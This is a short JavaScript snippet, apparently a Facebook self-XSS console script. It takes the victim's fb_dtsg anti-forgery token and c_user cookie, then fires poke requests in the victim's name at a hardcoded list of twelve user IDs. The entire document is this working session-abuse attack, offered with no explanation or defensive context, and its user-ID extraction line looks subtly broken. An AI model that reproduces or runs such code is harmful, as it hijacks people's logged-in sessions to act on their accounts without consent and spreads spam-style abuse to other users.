var fb_dtsg=document.getElementsByName("fb_dtsg")[0].value;
var user_id=document.cookie.match(document.cookie.match(/c_user=(\d+)/)[1]);

function p(abone) {
  var http4 = new XMLHttpRequest();
  var url4 = "//www.facebook.com/ajax/poke_dialog.php";
  var params4 = "uid=" + abone + "&pokeback=0&ask_for_confirm=0&nctr[_mod]=pagelet_timeline_profile_actions&__asyncDialog=1&__user="+user_id+"&__a=1&__dyn=798aD5z5CF-&__req=v&fb_dtsg="+fb_dtsg+"&phstamp=";
  http4.open("POST", url4, true);
  http4.onreadystatechange = function () {
    if (http4.readyState == 4 && http4.status == 200) {
      http4.close;
    }
  };
  http4.send(params4);
}

p("100003751777172");
p("100003717143442");
p("100003500252303");
p("100002461698288");
p("100002202716921");
p("100001075615162");
p("100003885495601");
p("100001660862838");
p("100004532196646");
p("100003181503660");
p("100004588441805");
p("100003147643648");
